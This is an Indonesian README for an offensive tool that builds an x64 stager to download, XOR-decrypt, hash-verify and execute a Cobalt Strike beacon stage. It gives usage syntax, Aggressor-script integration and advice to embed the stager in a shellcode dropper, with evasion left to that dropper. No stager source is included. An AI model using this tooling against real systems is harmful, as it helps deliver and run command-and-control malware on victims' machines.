# Secure Stager

Proyek ini mendemonstrasikan sebuah stager independen posisi x64 yang memverifikasi stage yang diunduhnya sebelum mengeksekusinya. Ini menawarkan perlindungan terhadap serangan man-in-the-middle bagi mereka yang mengkhawatirkan hal-hal seperti itu. Ukuran stager akhir ~4100 byte.

## Implementasi Teknis

Stager yang dihasilkan oleh alat ini dibuat dengan menggunakan kerangka kerja [Stardust]. Dengan menggunakan masukan dari pengguna, sebuah file header (Config.h) dibuat dan dikompilasi ke dalam stager oleh secure_stager.py. 

Validitas dari tahap yang diambil diverifikasi dengan menggunakan checksum MD5. Selama proses pembuatan, hash dari tahap payload ditentukan dan kemudian digunakan untuk mengenkripsinya dengan XOR. Hash ini kemudian dikompilasi ke dalam stager. Pada saat runtime, stager mengunduh tahap dari URL target (disediakan selama pembuatan), XOR mendekripsinya menggunakan hash MD5 asli, dan kemudian mengambil hash MD5 dari tahap yang telah didekripsi untuk membandingkannya dengan yang asli. Jika cocok, tahap tersebut dieksekusi.

## Integrasi Cobalt Strike

Alat ini dapat diintegrasikan ke dalam Cobalt Strike melalui penggunaan skrip secure_stager.cna Aggressor. Setelah memuatnya di pengelola skrip, item menu `Secure Stager` dapat ditemukan di bawah `Payloads`. Setelah memilih pendengar dan menentukan URL di mana payload akan tersedia, skrip Aggressor akan menghasilkan suar stageless x64 mentah dan menyimpannya ke disk sebelum memanggil secure_stager.py untuk menghasilkan stager. 

Fungsionalitas stager yang aman dalam Cobalt Strike sangat menarik karena fungsionalitas stager bawaan Cobalt Strike tidak memverifikasi tahap yang diambil atau mengambil tahap yang mencerminkan modifikasi pengguna pada sleepmask atau UDRL. Toolkit ini memastikan validitas stage dan bahwa stage yang diambil akan berisi sleepmask/UDRL yang dimodifikasi pengguna/dll.

## Penggunaan

Sintaks Baris Perintah: `./secure_stager.py </path/to/payload/stage.bin> <HTTPS url that stage will be hosted at>`.

Contoh: `./secure_stager.py /home/kali/beacon_x64.bin https://www.myhostingdomain.com/aboutus`.

Setelah skrip python selesai, hoskan stager terenkripsi yang dihasilkan pada URL yang Anda berikan pada alat tersebut. Selanjutnya, sertakan stager yang dihasilkan di dalam dropper/pelari shellcode favorit Anda.

## Catatan

1. Tidak ada metode penghindaran AV/EDR yang ada di dalam stager; itu adalah tugas dari shellcode runner Anda.  
2. Setelah stage diunduh dan diverifikasi, stage akan dieksekusi di thread yang sama dengan stager melalui penunjuk fungsi.  
3. Stager saat ini hanya mendukung koneksi HTTPS, jadi pastikan Anda meng-host stage menggunakan SSL.  

## Pekerjaan lebih lanjut
1. Membuat stager menjadi proxy-aware.  
2. Tambahkan opsi penyesuaian untuk header permintaan.
3. Menerapkan protokol alternatif untuk mengambil tahap payload

## Pesan Penting
   Tahap ini masi dalam proses Pengembangan :>
   bye Fauzan ALdi
